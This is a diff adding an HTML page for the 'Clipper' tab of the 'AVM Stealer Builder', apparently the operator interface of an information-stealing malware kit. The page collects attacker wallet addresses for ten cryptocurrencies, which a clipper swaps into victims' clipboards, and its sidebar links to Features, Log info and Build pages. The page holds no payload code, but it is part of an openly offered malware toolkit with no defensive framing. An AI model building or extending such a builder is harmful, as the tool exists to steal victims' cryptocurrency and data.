@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="style/style_binder.css">
+    <link rel="stylesheet" href="style/style_notification.css">
+    <link rel="stylesheet" href="style/style_transitions.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>AVM Stealer Builder</title>
+</head>
+
+<body>
+    <!-- Sidebar -->
+    <nav class="sidebar">
+        <div class="logo-menu">
+            <h2 class="logo">AVM Stealer</h2>
+            <i class="bx bx-menu toggle-btn"></i>
+        </div>
+        <ul class="list">
+            <li class="list-item">
+                <a href="index.html">
+                    <i class='bx bx-grid-alt'></i>
+                    <span class="link_name" style="--i:1">Features</span>
+                </a>
+            </li>
+            <li class="list-item active">
+                <a href="binder.html">
+                    <i class='bx bx-wallet bx-flashing'></i>
+                    <span class="link_name" style="--i:2">Clipper</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="info.html">
+                    <i class='bx bx-detail bx-flip-horizontal'></i>
+                    <span class="link_name" style="--i:3">Log info</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="build.html">
+                    <i class="bx bx-check-shield"></i>
+                    <span class="link_name" style="--i:4">Build</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="about.html">
+                    <i class='bx bx-info-circle'></i>
+                    <span class="link_name" style="--i:5">About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <!-- Background with blur effect -->
+        <div class="background-blur"></div>
+
+        <div class="maintitle">
+            <h1><i class='bx bx-wallet'></i> AVM Clipper</h1>
+            <button id="helpButton" class="help-button">
+                <i class='bx bx-info-circle'></i>Help
+            </button>
+        </div>
+
+        <div class="clipper-grid">
+            <!-- BTC -->
+            <div class="crypto-item" data-currency="btc">
+                <div class="crypto-header">
+                    <i class='bx bxl-bitcoin'></i>
+                    <span>Bitcoin (BTC)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="btc" placeholder="Address...">
+                    <div class="error-bubble">Invalid BTC Address!</div>
+                </div>
+            </div>
+
+            <!-- ETH -->
+            <div class="crypto-item" data-currency="eth">
+                <div class="crypto-header">
+                    <i class='bx bxl-ethereum'></i>
+                    <span>Ethereum (ETH/ERC20)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="eth" placeholder="Address...">
+                    <div class="error-bubble">Invalid ETH Address!</div>
+                </div>
+            </div>
+
+            <!-- LTC -->
+            <div class="crypto-item" data-currency="ltc">
+                <div class="crypto-header">
+                    <i class='bx bx-coin'></i>
+                    <span>Litecoin (LTC)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="ltc" placeholder="Address...">
+                    <div class="error-bubble">Invalid LTC Address!</div>
+                </div>
+            </div>
+
+            <!-- TRX -->
+            <div class="crypto-item" data-currency="trx">
+                <div class="crypto-header">
+                    <i class='bx bx-diamond'></i>
+                    <span>Tron (TRX/TRC20)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="trx" placeholder="Address...">
+                    <div class="error-bubble">Invalid TRX Address!</div>
+                </div>
+            </div>
+
+            <!-- BCH -->
+            <div class="crypto-item" data-currency="bch">
+                <div class="crypto-header">
+                    <i class='bx bx-money'></i>
+                    <span>Bitcoin Cash (BCH)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="bch" placeholder="Address...">
+                    <div class="error-bubble">Invalid BCH Address!</div>
+                </div>
+            </div>
+
+            <!-- XMR -->
+            <div class="crypto-item" data-currency="xmr">
+                <div class="crypto-header">
+                    <i class='bx bx-shield-quarter'></i>
+                    <span>Monero (XMR)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="xmr" placeholder="Address...">
+                    <div class="error-bubble">Invalid XMR Address!</div>
+                </div>
+            </div>
+
+            <!-- XRP -->
+            <div class="crypto-item" data-currency="xrp">
+                <div class="crypto-header">
+                    <i class='bx bx-transfer'></i>
+                    <span>Ripple (XRP)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="xrp" placeholder="Address...">
+                    <div class="error-bubble">Invalid XRP Address!</div>
+                </div>
+            </div>
+
+            <!-- ZCASH -->
+            <div class="crypto-item" data-currency="zcash">
+                <div class="crypto-header">
+                    <i class='bx bx-lock-alt'></i>
+                    <span>Zcash (ZEC)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="zcash" placeholder="Address...">
+                    <div class="error-bubble">Invalid Zcash Address!</div>
+                </div>
+            </div>
+
+            <!-- DOGE -->
+            <div class="crypto-item" data-currency="doge">
+                <div class="crypto-header">
+                    <i class='bx bxs-dog'></i>
+                    <span>Dogecoin (DOGE)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="doge" placeholder="Address...">
+                    <div class="error-bubble">Invalid Doge Address!</div>
+                </div>
+            </div>
+
+            <!-- SOL -->
+            <div class="crypto-item" data-currency="sol">
+                <div class="crypto-header">
+                    <i class='bx bx-sun'></i>
+                    <span>Solana (SOL)</span>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" id="sol" placeholder="Address...">
+                    <div class="error-bubble">Invalid SOL Address!</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="button-container">
+            <label class="selectButton" id="saveButton">
+                Save Clipper&nbsp;<i class='bx bx-save'></i>
+            </label>
+
+            <label class="selectButton" id="resetButton">
+                Clear All&nbsp;<i class='bx bx-trash'></i>
+            </label>
+        </div>
+    </div>
+    </div>
+    <script src="scripts/script_notification.js"></script>
+    <script src="scripts/script_transitions.js"></script>
+    <script src="scripts/script_binder.js"></script>
+</body>
+
+</html>
